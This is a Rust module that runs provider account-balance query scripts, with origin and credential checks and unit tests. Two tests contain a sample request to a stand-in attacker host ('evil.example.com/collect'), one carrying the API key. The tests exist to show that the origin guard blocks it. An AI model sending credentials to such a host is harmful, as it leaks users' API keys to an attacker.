//! The provider's account query.
//!
//! One question — how much of this account is left — answered by one script the
//! provider carries. The script was filled in by a preset or written by hand;
//! either way this module only runs it, and the reading of the answer lives in
//! the script rather than in a branch here.
//!
//! Most scripts ask one request. A named set asks several of the provider's
//! own endpoints in one refresh: every request passes the same credential and
//! target checks, the requests that must succeed fail the refresh together,
//! and the ones marked optional answer `null` instead — the extractor reads
//! what arrived rather than one answer.

use crate::models::{ApiKey, Provider};
use crate::services::query_script::{
    self, AccountUsage, NamedRequest, ResolvedRequests, ScriptLimits, ScriptRequest, ScriptVars,
};
use serde_json::Value;
use std::collections::BTreeMap;

/// Run the provider's account query.
///
/// The envelope keeps the field names the card and the tray already read, and
/// carries the metered periods alongside them, so a balance and a metering
/// service arrive through the same door.
pub async fn refresh_balance(
    provider: &Provider,
    fallback_api_keys: &[ApiKey],
) -> Result<Value, String> {
    let Some(script) = provider
        .wallet_balance_script
        .as_deref()
        .map(str::trim)
        .filter(|script| !script.is_empty())
    else {
        return Ok(not_configured());
    };

    let vars = vars_for(provider, fallback_api_keys);
    let usage = run(provider, script, &vars).await?;
    Ok(envelope(usage))
}

/// Run a script against a provider, end to end.
pub(super) async fn run(
    provider: &Provider,
    script: &str,
    vars: &ScriptVars,
) -> Result<AccountUsage, String> {
    let limits = ScriptLimits::default();
    run_with(
        &provider.base_url,
        script,
        vars,
        &limits,
        |request| async move { send(provider, &request).await },
    )
    .await
}

/// Run a script against a provider address, with the sender injectable.
///
/// `send` is the seam that keeps the offline tests offline: it takes the
/// resolved request by value and answers with the parsed body or the failure
/// the user would have seen. Resolution, the per-request credential and
/// origin checks, aggregation and extraction run identically for every
/// caller, single or named.
pub(super) async fn run_with<F, Fut>(
    base_url: &str,
    script: &str,
    vars: &ScriptVars,
    limits: &ScriptLimits,
    send: F,
) -> Result<AccountUsage, String>
where
    F: Fn(ScriptRequest) -> Fut,
    Fut: std::future::Future<Output = Result<Value, String>>,
{
    let resolved = query_script::resolve_requests(script, vars, limits)
        .map_err(|error| error.message().to_string())?;

    match resolved {
        ResolvedRequests::Single(request) => {
            ensure_query_credentials(&request)?;
            query_script::is_permitted_target(&request.url, base_url)?;
            let response = send(request).await?;
            query_script::run_extractor(script, vars, &response, limits)
                .map_err(|error| error.message().to_string())
        }
        ResolvedRequests::Many(named) => {
            run_many(base_url, script, vars, limits, named, send).await
        }
    }
}

/// Send the named requests and read them in one extraction.
///
/// Every request passes its credential and origin check, and all required
/// requests pass check before anything is sent, so a required request that
/// cannot go fails the refresh with no part of the set having left. The sends
/// run concurrently; each answers either its parsed body or its failure, and
/// the optional failures carry on as `null` instead of failing the refresh.
async fn run_many<F, Fut>(
    base_url: &str,
    script: &str,
    vars: &ScriptVars,
    limits: &ScriptLimits,
    named: BTreeMap<String, NamedRequest>,
    send: F,
) -> Result<AccountUsage, String>
where
    F: Fn(ScriptRequest) -> Fut,
    Fut: std::future::Future<Output = Result<Value, String>>,
{
    let mut planned: Vec<(String, ScriptRequest)> = Vec::new();
    let mut rejected: Vec<(String, Result<Value, String>)> = Vec::new();
    for (name, named) in &named {
        let check = ensure_query_credentials(&named.request)
            .and_then(|()| query_script::is_permitted_target(&named.request.url, base_url));
        match check {
            Ok(()) => planned.push((name.clone(), named.request.clone())),
            // An optional request that cannot happen contributes its null and
            // must not hold the rest of the refresh against it.
            Err(message) if named.optional => {
                rejected.push((name.clone(), Err(message)));
            }
            Err(message) => return Err(message),
        }
    }

    let names: Vec<String> = planned.iter().map(|(name, _)| name.clone()).collect();
    let sent =
        futures::future::join_all(planned.into_iter().map(|(_, request)| send(request))).await;
    let mut outcomes: Vec<(String, Result<Value, String>)> = names.into_iter().zip(sent).collect();
    outcomes.extend(rejected);

    let responses = aggregate_responses(&named, &outcomes)?;
    query_script::run_extractor_many(script, vars, &responses, limits)
        .map_err(|error| error.message().to_string())
}

fn ensure_query_credentials(request: &ScriptRequest) -> Result<(), String> {
    for (placeholder, message) in [
        ("{{apiKey}}", "添加并启用 API 密钥后可查询额度"),
        ("{{accessToken}}", "请先配置账户访问令牌"),
        ("{{userId}}", "请先配置账户用户 ID"),
    ] {
        if request.url.contains(placeholder)
            || request
                .headers
                .values()
                .any(|value| value.contains(placeholder))
        {
            return Err(message.to_string());
        }
    }
    Ok(())
}

/// Merge per-request outcomes into the responses object the extractor reads.
///
/// Pure, so the many-request contract is provable offline: a required failure
/// aborts the whole refresh with its message (the first failure in request
/// order wins), and an optional failure becomes `null` — never an empty
/// object an extractor could misread as an answer.
fn aggregate_responses(
    requests: &BTreeMap<String, NamedRequest>,
    outcomes: &[(String, Result<Value, String>)],
) -> Result<BTreeMap<String, Option<Value>>, String> {
    let mut responses = BTreeMap::new();
    for (name, outcome) in outcomes {
        let Some(named) = requests.get(name) else {
            return Err(format!("outcome reported for the unnamed request {name}"));
        };
        match outcome {
            Ok(response) => {
                responses.insert(name.clone(), Some(response.clone()));
            }
            Err(message) if named.optional => {
                responses.insert(name.clone(), None);
            }
            Err(message) => return Err(message.clone()),
        }
    }
    Ok(responses)
}

async fn send(provider: &Provider, request: &ScriptRequest) -> Result<Value, String> {
    let mut outgoing = crate::services::http_client::outbound_client_for_provider(Some(provider))?
        .get(&request.url)
        .header("Content-Type", "application/json");
    for (name, value) in &request.headers {
        outgoing = outgoing.header(name, value);
    }

    let response = outgoing.send().await.map_err(|e| e.to_string())?;
    if !response.status().is_success() {
        return Err(format!("HTTP {}", response.status().as_u16()));
    }

    response.json().await.map_err(|e| e.to_string())
}

/// The values a script may reference.
pub(super) fn vars_for(provider: &Provider, fallback_api_keys: &[ApiKey]) -> ScriptVars {
    ScriptVars {
        base_url: provider.base_url.trim_end_matches('/').to_string(),
        // The inference credential, borrowed so a query can authenticate as the
        // account it is asking about.
        api_key: pick_first_available_key(fallback_api_keys)
            .or_else(|| non_empty(provider.token.clone())),
        access_token: non_empty(provider.token.clone()),
        user_id: non_empty(provider.wallet_balance_user_id.clone()),
    }
}

fn envelope(usage: AccountUsage) -> Value {
    serde_json::json!({
        "balance": usage.remaining,
        "total": usage.total,
        "used": usage.used,
        "unlimited": usage.is_unlimited.unwrap_or(false),
        "currency": usage.unit,
        "windows": usage.windows,
        "isValid": usage.is_valid.unwrap_or(true),
        "invalidMessage": usage.invalid_message,
        "error": Value::Null,
    })
}

pub(super) fn not_configured() -> Value {
    serde_json::json!({
        "balance": Value::Null,
        "total": Value::Null,
        "used": Value::Null,
        "unlimited": false,
        "currency": Value::Null,
        "windows": Vec::<Value>::new(),
        "isValid": true,
        "invalidMessage": Value::Null,
        "error": "尚未配置账户查询",
    })
}

fn non_empty(value: Option<String>) -> Option<String> {
    value
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
}

/// The credential a query borrows when it names none of its own.
pub(super) fn pick_first_available_key(api_keys: &[ApiKey]) -> Option<String> {
    api_keys
        .iter()
        .filter(|key| key.is_active && !key.is_exhausted && !key.value.trim().is_empty())
        .min_by_key(|key| key.priority)
        .map(|key| key.value.clone())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::Provider;
    use crate::shared_runtime::account_scripts::command_code_script;
    use serde_json::json;

    #[tokio::test]
    async fn a_query_without_its_required_key_stops_before_network_io() {
        let mut provider = provider();
        provider.token = None;
        provider.wallet_balance_script = Some(
            "({request:{url:'{{baseUrl}}/usage',headers:{Authorization:'Bearer {{apiKey}}'}},extractor:r=>({remaining:r.balance})})".into(),
        );
        let error = refresh_balance(&provider, &[]).await.unwrap_err();
        assert_eq!(error, "添加并启用 API 密钥后可查询额度");
    }

    #[test]
    fn an_account_token_query_does_not_require_an_inference_key() {
        let request = query_script::resolve_request(
            "({request:{url:'{{baseUrl}}/usage',headers:{Authorization:'{{accessToken}}'}},extractor:r=>({remaining:r.balance})})",
            &ScriptVars { base_url: "https://example.com".into(), access_token: Some("fixture".into()), ..Default::default() },
            &ScriptLimits::default(),
        ).unwrap();
        assert!(ensure_query_credentials(&request).is_ok());
    }

    fn provider() -> Provider {
        Provider {
            id: "p1".to_string(),
            name: "relay".to_string(),
            base_url: "https://relay.example.com".to_string(),
            http_proxy: None,
            website: None,
            remark: None,
            token: Some("tok-1".to_string()),
            icon: None,
            wallet_balance_type: "custom".to_string(),
            wallet_balance_url: None,
            wallet_balance_path: None,
            wallet_balance_headers: None,
            wallet_balance_user_id: Some("uid-7".to_string()),
            cached_wallet_balance: None,
            cached_wallet_balance_currency: None,
            last_balance_checked_at: None,
            usage_type: "none".to_string(),
            usage_url: None,
            usage_path: None,
            usage_headers: None,
            cached_usage: None,
            last_usage_checked_at: None,
            is_active: true,
            sort_order: 0,
            preset_id: "custom".to_string(),
            default_key_config: None,
            request_adapter: "none".to_string(),
            wallet_balance_script: None,
            request_headers: None,
        }
    }

    fn key(value: &str, priority: i64) -> ApiKey {
        serde_json::from_value(serde_json::json!({
            "id": format!("k-{value}"),
            "providerId": "p1",
            "value": value,
            "priority": priority,
            "types": ["claude_code"],
            "isExhausted": false,
            "isActive": true,
            "usageType": "none"
        }))
        .expect("key fixture")
    }

    #[test]
    fn a_provider_without_a_script_says_so_instead_of_failing() {
        let envelope = not_configured();

        assert_eq!(envelope["error"], "尚未配置账户查询");
        assert!(envelope["balance"].is_null());
    }

    #[test]
    fn the_variables_name_the_credential_the_query_borrows() {
        let vars = vars_for(&provider(), &[key("sk-live", 0)]);

        assert_eq!(vars.base_url, "https://relay.example.com");
        assert_eq!(vars.api_key.as_deref(), Some("sk-live"));
        assert_eq!(vars.access_token.as_deref(), Some("tok-1"));
        assert_eq!(vars.user_id.as_deref(), Some("uid-7"));
    }

    #[test]
    fn the_lowest_priority_available_key_is_the_one_borrowed() {
        let mut exhausted = key("sk-dead", 0);
        exhausted.is_exhausted = true;

        let vars = vars_for(&provider(), &[exhausted, key("sk-live", 5)]);

        assert_eq!(vars.api_key.as_deref(), Some("sk-live"));
    }

    /// The envelope keeps the names the card reads, and adds the metered
    /// periods beside them.
    #[test]
    fn the_envelope_carries_a_balance_and_its_periods_together() {
        let envelope = envelope(AccountUsage {
            remaining: Some(12.5),
            unit: Some("USD".to_string()),
            ..AccountUsage::default()
        });

        assert_eq!(envelope["balance"], 12.5);
        assert_eq!(envelope["currency"], "USD");
        assert!(envelope["error"].is_null());
    }

    // The named-request contract. The sender below is the seam: it never
    // opens a connection, it answers per request url like the wire would.

    fn command_code_vars() -> ScriptVars {
        ScriptVars {
            base_url: "https://api.commandcode.ai/provider".to_string(),
            api_key: Some("sk-cc".to_string()),
            ..ScriptVars::default()
        }
    }

    /// The bodies the three Command Code endpoints answer, keyed by route.
    fn command_code_body(url: &str) -> Result<Value, String> {
        if url.ends_with("/alpha/billing/credits") {
            Ok(json!({
                "credits": {
                    "monthlyCredits": 10,
                    "purchasedCredits": 4,
                    "freeCredits": 1,
                    "planId": "individual_provider",
                    "windowLimits": {
                        "fiveHour": { "used": 2, "cap": 10, "resetAt": 1767225600000i64 },
                        "weekly": { "used": 7, "cap": 0, "resetAt": 0 }
                    }
                }
            }))
        } else if url.ends_with("/alpha/billing/subscriptions") {
            Ok(json!({
                "success": true,
                "data": {
                    "planId": "individual-provider",
                    "status": "active",
                    "currentPeriodStart": 1764547200000i64,
                    "currentPeriodEnd": 1767225600000i64
                }
            }))
        } else if url.ends_with("/alpha/usage/summary") {
            Ok(json!({ "totalCost": 3.75 }))
        } else {
            Err("HTTP 404".to_string())
        }
    }

    /// Run the shipped Command Code script against a fake wire, where every
    /// url in `failures` answers the given failure like a route would.
    async fn run_command_code(
        failing: &[&str],
        failing_with: &'static str,
    ) -> Result<AccountUsage, String> {
        run_with(
            "https://api.commandcode.ai/provider",
            command_code_script(),
            &command_code_vars(),
            &ScriptLimits::default(),
            |request| {
                let broken = failing.iter().any(|route| request.url.ends_with(route));
                async move {
                    if broken {
                        Err(failing_with.to_string())
                    } else {
                        command_code_body(&request.url)
                    }
                }
            },
        )
        .await
    }

    #[tokio::test]
    async fn the_named_set_is_sent_together_and_read_as_one_usage() {
        let usage = run_command_code(&[], "").await.expect("read");

        assert_eq!(usage.remaining, Some(15.0));
        assert_eq!(usage.unit.as_deref(), Some("credits"));
        let by_id = |id: &str| {
            usage
                .windows
                .iter()
                .find(|window| window.id == id)
                .cloned()
                .expect("window present in the happy path")
        };
        assert_eq!(by_id("weekly").used_percent, None);
        assert_eq!(by_id("monthly").used_percent, Some(25.0));
        assert_eq!(
            by_id("monthly").resets_at.as_deref(),
            Some("2026-01-01T00:00:00.000Z")
        );
    }

    #[tokio::test]
    async fn an_optional_request_that_fails_answers_null_and_refresh_still_stands() {
        let usage = run_command_code(&["/alpha/billing/subscriptions"], "HTTP 401")
            .await
            .expect("the optional failure does not fail the refresh");

        // The month's row is still reported for the plan account (that state
        // belongs to the frontend); its inputs stayed empty.
        let ids: Vec<&str> = usage
            .windows
            .iter()
            .map(|window| window.id.as_str())
            .collect();
        assert_eq!(ids, vec!["rolling", "weekly", "monthly"]);
        let monthly = usage
            .windows
            .iter()
            .find(|window| window.id == "monthly")
            .expect("monthly row present");
        assert_eq!(monthly.used_percent, None);
        assert_eq!(monthly.resets_at, None);
        assert_eq!(usage.remaining, Some(15.0));
    }

    #[tokio::test]
    async fn a_failed_optional_summary_leaves_the_month_percent_missing() {
        let usage = run_command_code(&["/alpha/usage/summary"], "HTTP 503")
            .await
            .expect("the optional failure does not fail the refresh");

        let monthly = usage
            .windows
            .iter()
            .find(|window| window.id == "monthly")
            .expect("subscriptions answered, so the month has its row");
        assert_eq!(monthly.used_percent, None);
        assert_eq!(
            monthly.resets_at.as_deref(),
            Some("2026-01-01T00:00:00.000Z")
        );
    }

    #[tokio::test]
    async fn a_required_request_that_fails_fails_the_whole_refresh() {
        let error = run_command_code(&["/alpha/billing/credits"], "HTTP 500")
            .await
            .unwrap_err();

        assert_eq!(error, "HTTP 500");
    }

    #[tokio::test]
    async fn a_required_request_with_a_missing_credential_stops_before_the_network() {
        let vars = ScriptVars {
            base_url: "https://api.commandcode.ai/provider".to_string(),
            api_key: None,
            ..ScriptVars::default()
        };

        let error = run_with(
            "https://api.commandcode.ai/provider",
            command_code_script(),
            &vars,
            &ScriptLimits::default(),
            // Reaching this sender would mean the guard is not the failure
            // that fired.
            |_| async { Err("the fake sender was reached".to_string()) },
        )
        .await
        .unwrap_err();

        assert_eq!(error, "添加并启用 API 密钥后可查询额度");
    }

    #[tokio::test]
    async fn a_required_request_outside_the_provider_origin_stops_before_the_network() {
        let script = r#"({
            requests: {
                credit: { url: "https://evil.example.com/collect", headers: { Authorization: "Bearer {{apiKey}}" } },
                extra: { url: "https://api.commandcode.ai/alpha/billing/subscriptions", optional: true }
            },
            extractor: (responses) => ({})
        })"#;

        let error = run_with(
            "https://api.commandcode.ai/provider",
            script,
            &command_code_vars(),
            &ScriptLimits::default(),
            |_| async { Err("the fake sender was reached".to_string()) },
        )
        .await
        .unwrap_err();

        assert!(error.contains("the query URL must be on the provider's own origin"));
    }

    /// A failed optional request contributes the JSON null — proven by an
    /// extractor that can tell `null` from an empty object.
    #[tokio::test]
    async fn an_optional_failure_flows_in_as_null_not_as_an_empty_object() {
        let script = r#"({
            requests: {
                credit: { url: "https://api.commandcode.ai/alpha/billing/credits", headers: { Authorization: "Bearer {{apiKey}}" } },
                side: { url: "https://evil.example.com/collect", optional: true }
            },
            extractor: (responses) => ({
                remaining: responses.credit.credits.monthlyCredits,
                total: responses.side === null ? 1 : 0
            })
        })"#;

        let usage = run_with(
            "https://api.commandcode.ai/provider",
            script,
            &command_code_vars(),
            &ScriptLimits::default(),
            |request| async move { command_code_body(&request.url) },
        )
        .await
        .expect("the optional origin violation nulls it, it does not fail");

        assert_eq!(usage.remaining, Some(10.0));
        assert_eq!(usage.total, Some(1.0));
    }

    // The aggregation is a pure function on purpose; here it is without any
    // future involved.

    fn named_requests() -> BTreeMap<String, NamedRequest> {
        let request = |url: &str| ScriptRequest {
            url: url.to_string(),
            method: "GET".to_string(),
            headers: Default::default(),
        };
        BTreeMap::from([
            (
                "credit".to_string(),
                NamedRequest {
                    request: request("https://x/credits"),
                    optional: false,
                },
            ),
            (
                "glance".to_string(),
                NamedRequest {
                    request: request("https://x/glance"),
                    optional: true,
                },
            ),
        ])
    }

    #[test]
    fn aggregation_nulls_optional_failures_and_keeps_required_bodies() {
        let requests = named_requests();
        let responses = aggregate_responses(
            &requests,
            &[
                ("credit".to_string(), Ok(json!({ "balance": 5 }))),
                ("glance".to_string(), Err("HTTP 401".to_string())),
            ],
        )
        .expect("only the optional one failed");

        assert_eq!(responses["glance"], None);
        assert_eq!(responses["credit"], Some(json!({ "balance": 5 })));
    }

    #[test]
    fn aggregation_loses_to_the_first_required_failure() {
        let requests = named_requests();

        let error = aggregate_responses(
            &requests,
            &[
                ("glance".to_string(), Err("HTTP 401".to_string())),
                ("credit".to_string(), Err("HTTP 500".to_string())),
            ],
        )
        .unwrap_err();

        assert_eq!(error, "HTTP 500");
    }
}
